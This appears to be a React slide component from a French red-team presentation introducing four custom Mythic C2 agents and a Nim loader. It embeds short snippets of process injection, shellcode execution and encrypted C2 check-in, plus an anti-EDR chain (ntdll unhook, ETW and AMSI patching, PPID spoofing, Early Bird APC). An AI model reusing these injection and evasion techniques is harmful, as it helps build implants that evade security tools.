import { SlideContext, SlideMeta } from '../engine/types'
import { motion } from 'framer-motion'
import { tokens } from '../design/tokens'
import { Eyebrow } from '../ui/Eyebrow'
import { AgentCard, Tag } from './_shared'

export const meta: SlideMeta = {
  title: 'Les 4 agents',
  speaker: ['Jeremy'],
  notes: 'Présentez les 4 agents from scratch. Insistez : chaque langage, chaque OS, chaque snippet est réel. Puis Hephaestus le loader.',
}

const AGENTS = [
  {
    lang: 'C',
    name: 'Kratos',
    os: 'Windows',
    color: tokens.color.accent.blue,
    desc: 'Agent C minimaliste. Footprint réduit, DLL injection, aucune dépendance.',
    code: `LPVOID buf = VirtualAllocEx(hProc, 0,
  sz, MEM_COMMIT|MEM_RESERVE,
  PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, buf, sc, sz, 0);`,
  },
  {
    lang: 'Go',
    name: 'Morpheus',
    os: 'Windows',
    color: tokens.color.accent.teal,
    desc: 'Obfusqué via garble — aucun import visible dans le binaire compilé.',
    code: `hProc, _ := windows.OpenProcess(
  windows.PROCESS_ALL_ACCESS,
  false, uint32(pid))
defer windows.CloseHandle(hProc)`,
  },
  {
    lang: 'Py',
    name: 'Hermes',
    os: 'Linux',
    color: tokens.color.semantic.warning,
    desc: 'Flexibilité post-exploitation, scripting inline, compatible Python 3.',
    code: `buf = ctypes.windll.kernel32\\
  .VirtualAlloc(0,len(sc),0x3000,0x40)
ctypes.windll.kernel32\\
  .RtlMoveMemory(buf, sc, len(sc))`,
  },
  {
    lang: 'Nim',
    name: 'Aphrodite',
    os: 'Cross-platform',
    color: tokens.color.accent.violet,
    desc: '42 commandes, AES-256-CBC, HMAC-SHA256, hidstr XOR compile-time.',
    code: `let key = hidstr("SL_PSK_AES256")
let enc = aesCBC.encrypt(payload, key)
discard checkin(b64encode(enc),
  config.uuid, config.c2)`,
  },
]

export function Component(_: SlideContext) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 24, width: '100%', alignItems: 'flex-start' }}>

      <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.4 }}>
        <Eyebrow>06 — Agents Mythic</Eyebrow>
      </motion.div>

      <motion.h2
        initial={{ opacity: 0, y: 16 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5, delay: 0.1 }}
        style={{ fontSize: tokens.type.size['2xl'], fontWeight: tokens.type.weight.semibold, letterSpacing: tokens.type.tracking.tight, color: tokens.color.text.primary, margin: 0 }}
      >
        4 agents développés from scratch
      </motion.h2>

      <motion.div
        initial="hidden"
        animate="show"
        variants={{ hidden: {}, show: { transition: { staggerChildren: 0.1, delayChildren: 0.15 } } }}
        style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 12, width: '100%' }}
      >
        {AGENTS.map(({ lang, name, os, color, desc, code }) => (
          <motion.div key={name} variants={{ hidden: { opacity: 0, y: 20 }, show: { opacity: 1, y: 0, transition: { duration: 0.5 } } }}>
            <AgentCard lang={lang} name={name} os={os} color={color} desc={desc} code={code} />
          </motion.div>
        ))}
      </motion.div>

      <motion.div
        initial={{ opacity: 0, y: 14 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5, delay: 0.58 }}
        style={{
          width: '100%',
          background: tokens.color.surface.subtle,
          border: `1px solid ${tokens.color.surface.line}`,
          borderLeft: `2px solid ${tokens.color.semantic.warning}`,
          borderRadius: 8,
          padding: '14px 20px',
          display: 'flex',
          alignItems: 'flex-start',
          gap: 18,
        }}
      >
        <div style={{ flexShrink: 0 }}>
          <div style={{ fontFamily: tokens.type.family.mono, fontSize: tokens.type.size.md, fontWeight: 700, color: tokens.color.semantic.warning, marginBottom: 6 }}>Hephaestus</div>
          <Tag color={tokens.color.semantic.warning}>Loader Nim · Windows</Tag>
        </div>
        <div style={{ width: 1, alignSelf: 'stretch', background: tokens.color.surface.line, flexShrink: 0 }} />
        <div style={{ display: 'flex', flex: 1, gap: 20 }}>
          <p style={{ fontSize: tokens.type.size.sm, color: tokens.color.text.secondary, lineHeight: tokens.type.leading.relaxed, margin: 0, flex: 1 }}>
            Wrape Aphrodite via <strong style={{ color: tokens.color.text.primary, fontFamily: tokens.type.family.mono }}>donut</strong> (EXE&thinsp;→&thinsp;shellcode), applique la chaîne anti-EDR et injecte dans un process cible via Early Bird APC ou Thread Hijacking.
          </p>
          <pre style={{ fontFamily: tokens.type.family.mono, fontSize: '11px', color: '#52525b', background: '#05050a', border: `1px solid ${tokens.color.surface.line}`, borderRadius: 5, padding: '8px 12px', margin: 0, lineHeight: 1.6, flexShrink: 0 }}>
{`ntdll unhook → ETW patch → AMSI patch
PPID spoof   → VirtualAllocEx
→  Early Bird APC  |  Thread Hijack
→  wipe shellcode buffer`}
          </pre>
        </div>
      </motion.div>

    </div>
  )
}
